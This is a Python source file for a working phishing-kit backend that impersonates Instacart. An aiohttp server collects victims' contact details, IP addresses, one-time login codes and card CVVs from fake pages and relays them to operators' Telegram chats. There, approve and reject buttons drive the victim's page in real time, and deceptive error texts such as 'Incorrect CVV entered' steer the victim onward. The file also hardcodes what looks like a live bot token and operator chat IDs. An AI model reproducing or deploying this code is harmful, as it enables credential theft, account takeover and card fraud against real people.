import asyncio
import json
import pickle
import os
from datetime import datetime
from aiohttp import web
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8793946546:AAFj8upk5P_kumkmn0Qs98fZRY9OSsteBnQ"
CHAT_IDS = [1368071733, 6996287179]
PORT = 8081
SESSION_FILE = '/var/www/instacart/sessions.pkl'

# In-memory storage for sessions (with persistent backup)
sessions = {}
pending_card_inputs = {}

# Load sessions from file
def load_sessions():
    global sessions
    try:
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'rb') as f:
                sessions = pickle.load(f)
            logger.info(f"Loaded {len(sessions)} sessions from disk")
    except Exception as e:
        logger.error(f"Error loading sessions: {e}")
        sessions = {}

# Save sessions to file
def save_sessions():
    try:
        with open(SESSION_FILE, 'wb') as f:
            pickle.dump(sessions, f)
    except Exception as e:
        logger.error(f"Error saving sessions: {e}")

# Web API handlers
async def submit_data(request):
    """Handle data submission from web form"""
    try:
        data = await request.json()
        session_id = data.get('session')
        step = data.get('step')
        form_data = data.get('data', {})
        
        # Get IP address
        ip_address = request.headers.get('X-Real-IP') or request.headers.get('X-Forwarded-For') or request.remote
        
        # Store session data
        if session_id not in sessions:
            sessions[session_id] = {
                'ip': ip_address,
                'started': datetime.now().isoformat()
            }
        
        sessions[session_id].update({
            'step': step,
            'data': form_data,
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        })
        
        # Save sessions to disk
        save_sessions()
        
        # Send to Telegram
        await send_to_telegram(session_id, step, form_data, ip_address)
        
        return web.json_response({
            'success': True,
            'session': session_id,
            'message': 'Data sent to operator'
        })
    except Exception as e:
        logger.error(f"Error in submit_data: {e}")
        return web.json_response({
            'success': False,
            'error': str(e)
        }, status=500)

async def check_status(request):
    """Check approval status for polling"""
    try:
        session_id = request.query.get('session')
        step = request.query.get('step')
        
        if session_id not in sessions:
            return web.json_response({
                'approved': False,
                'rejected': False,
                'pending': True
            })
        
        session = sessions[session_id]
        status = session.get('status', 'pending')
        
        response = {
            'approved': status == 'approved',
            'rejected': status == 'rejected',
            'pending': status == 'pending'
        }
        
        # Include card last 4 for code step
        if status == 'approved' and step == 'code' and 'cardLast4' in session:
            response['cardLast4'] = session['cardLast4']
        
        return web.json_response(response)
    except Exception as e:
        logger.error(f"Error in check_status: {e}")
        return web.json_response({
            'approved': False,
            'rejected': False,
            'pending': True,
            'error': str(e)
        })

async def send_to_telegram(session_id, step, data, ip_address):
    """Send notification to Telegram - one message that gets edited"""
    bot = Bot(token=BOT_TOKEN)
    
    # Build progressive message
    session = sessions[session_id]
    contact = session.get('data', {}).get('contact', data.get('contact', 'N/A'))
    contact_type = session.get('data', {}).get('type', data.get('type', 'N/A'))
    
    message = f"""🎯 <b>Instacart Verification #{session_id[-8:]}</b>

🌐 <b>IP:</b> <code>{ip_address}</code>
📧 <b>Contact:</b> <code>{contact}</code>
📱 <b>Type:</b> {contact_type.upper()}
⏰ <b>Started:</b> {session.get('started', datetime.now().isoformat())[11:19]}
"""
    
    # Add step-specific data
    if step == 'phone':
        message += f"\n🔄 <b>Status:</b> Waiting for approval..."
        keyboard = [
            [
                InlineKeyboardButton("✅ Approve", callback_data=f"approve:{session_id}:phone"),
                InlineKeyboardButton("❌ Reject", callback_data=f"reject:{session_id}:phone")
            ]
        ]
        
    elif step == 'code':
        code = data.get('code', 'N/A')
        message += f"\n🔑 <b>Code:</b> <code>{code}</code>"
        message += f"\n🔄 <b>Status:</b> Code received, enter card last 4..."
        keyboard = [
            [
                InlineKeyboardButton("💳 Enter Card Last 4", callback_data=f"card:input:{session_id}"),
                InlineKeyboardButton("❌ Reject", callback_data=f"reject:{session_id}:code")
            ]
        ]
        
    elif step == 'card':
        code = session.get('data', {}).get('code', 'N/A')
        card_last4 = session.get('cardLast4', '****')
        cvv = data.get('cvv', 'N/A')
        message += f"\n🔑 <b>Code:</b> <code>{code}</code>"
        message += f"\n💳 <b>Card:</b> ****{card_last4}"
        message += f"\n🔒 <b>CVV:</b> <code>{cvv}</code>"
        message += f"\n🔄 <b>Status:</b> Final approval needed..."
        keyboard = [
            [
                InlineKeyboardButton("✅ Approve", callback_data=f"approve:{session_id}:card"),
                InlineKeyboardButton("❌ Reject", callback_data=f"reject:{session_id}:card")
            ]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send or edit message
    if 'message_ids' not in session:
        session['message_ids'] = {}
    
    # Send to all chat IDs
    for chat_id in CHAT_IDS:
        try:
            if chat_id in session.get('message_ids', {}):
                # Edit existing message
                msg = await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=session['message_ids'][chat_id],
                    text=message,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            else:
                # Send new message
                msg = await bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                session['message_ids'][chat_id] = msg.message_id
        except Exception as e:
            logger.error(f"Error sending to chat {chat_id}: {e}")

# Telegram bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    await update.message.reply_text(
        "🤖 Instacart Verification Bot\n\n"
        "This bot will notify you of verification requests.\n"
        f"Your Chat ID: {update.effective_chat.id}"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    parts = data.split(':')  # Changed from '_' to ':'
    action = parts[0]
    
    # Handle special case for card:input:{session_id}
    if action == 'card' and len(parts) >= 3 and parts[1] == 'input':
        session_id = parts[2]
        # Store context for expecting card input
        pending_card_inputs[query.from_user.id] = (session_id, query.message.chat.id, query.message.message_id)
        current_text = query.message.text_html
        new_text = current_text.replace('🔄 <b>Status:</b>', f'💳 <b>Status:</b>')
        new_text += f"\n\n💬 <b>Reply with last 4 digits to show card ending...</b>"
        await query.edit_message_text(
            text=new_text,
            parse_mode='HTML'
        )
        return
    
    # Regular approve/reject buttons: approve:{session_id}:{step}
    session_id = parts[1]
    step = parts[2] if len(parts) > 2 else None
    
    # Check if session exists
    if session_id not in sessions:
        await query.edit_message_text(
            text=f"{query.message.text_html}\n\n⚠️ <b>Session expired or invalid</b>",
            parse_mode='HTML'
        )
        return
    
    if action == 'approve':
        sessions[session_id]['status'] = 'approved'
        save_sessions()
        # Add approval status to message
        current_text = query.message.text_html
        new_text = current_text.replace('🔄 <b>Status:</b>', f'✅ <b>Status:</b>')
        new_text = new_text.replace('💳 <b>Status:</b>', f'✅ <b>Status:</b>')
        new_text += f"\n\n✅ <b>APPROVED</b> by @{query.from_user.username or query.from_user.first_name} at {datetime.now().strftime('%H:%M:%S')}"
        await query.edit_message_text(
            text=new_text,
            parse_mode='HTML'
        )
        
    elif action == 'reject':
        sessions[session_id]['status'] = 'rejected'
        save_sessions()
        
        # Custom rejection messages based on step
        rejection_messages = {
            'phone': '❌ Account does not exist',
            'code': '❌ Verification code is invalid',
            'card': '❌ Incorrect CVV entered'
        }
        rejection_reason = rejection_messages.get(step, '❌ Rejected')
        
        # Add rejection status to message
        current_text = query.message.text_html
        new_text = current_text.replace('🔄 <b>Status:</b>', f'❌ <b>Status:</b>')
        new_text = new_text.replace('💳 <b>Status:</b>', f'❌ <b>Status:</b>')
        new_text += f"\n\n{rejection_reason} by @{query.from_user.username or query.from_user.first_name} at {datetime.now().strftime('%H:%M:%S')}"
        await query.edit_message_text(
            text=new_text,
            parse_mode='HTML'
        )

async def handle_card_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle card last 4 digits input"""
    user_id = update.effective_user.id
    
    if user_id not in pending_card_inputs:
        return
    
    session_id, chat_id, message_id = pending_card_inputs[user_id]
    card_last4 = update.message.text.strip()
    
    # Validate input
    if not card_last4.isdigit() or len(card_last4) != 4:
        msg = await update.message.reply_text("❌ Please enter exactly 4 digits")
        # Delete error message after 3 seconds
        await asyncio.sleep(3)
        try:
            await msg.delete()
            await update.message.delete()
        except:
            pass
        return
    
    # Delete the user's message immediately
    try:
        await update.message.delete()
    except Exception as e:
        logger.error(f"Error deleting user message: {e}")
    
    # Store card last 4
    sessions[session_id]['cardLast4'] = card_last4
    sessions[session_id]['status'] = 'approved'
    save_sessions()
    
    # Remove pending input
    del pending_card_inputs[user_id]
    
    # Update the original message
    bot = Bot(token=BOT_TOKEN)
    session = sessions[session_id]
    
    updated_message = await get_updated_message(session_id, card_last4)
    
    for chat_id in CHAT_IDS:
        try:
            if chat_id in session.get('message_ids', {}):
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=session['message_ids'][chat_id],
                    text=updated_message,
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"Error updating message in chat {chat_id}: {e}")

async def get_updated_message(session_id, card_last4):
    """Generate updated message with card info"""
    session = sessions[session_id]
    contact = session.get('data', {}).get('contact', 'N/A')
    contact_type = session.get('data', {}).get('type', 'N/A')
    code = session.get('data', {}).get('code', 'N/A')
    ip_address = session.get('ip', 'N/A')
    
    message = f"""🎯 <b>Instacart Verification #{session_id[-8:]}</b>

🌐 <b>IP:</b> <code>{ip_address}</code>
📧 <b>Contact:</b> <code>{contact}</code>
📱 <b>Type:</b> {contact_type.upper()}
⏰ <b>Started:</b> {session.get('started', datetime.now().isoformat())[11:19]}

🔑 <b>Code:</b> <code>{code}</code>
💳 <b>Card:</b> ****{card_last4}

✅ <b>Status:</b> Card approved, waiting for CVV..."""
    
    return message

async def init_web_app():
    """Initialize web server"""
    app = web.Application()
    app.router.add_post('/api/submit-data', submit_data)
    app.router.add_get('/api/check-status', check_status)
    
    # Serve static files
    app.router.add_static('/', '/var/www/instacart', show_index=True)
    
    return app

async def main():
    """Main function"""
    # Load existing sessions from disk
    load_sessions()
    
    # Initialize Telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_input))
    
    # Start bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # Start web server
    app = await init_web_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    logger.info(f"Web server started on port {PORT}")
    logger.info("Telegram bot started")
    logger.info(f"Monitoring chat IDs: {CHAT_IDS}")
    
    # Keep running
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        save_sessions()  # Save sessions before shutdown
        await application.stop()
        await runner.cleanup()

if __name__ == '__main__':
    asyncio.run(main())
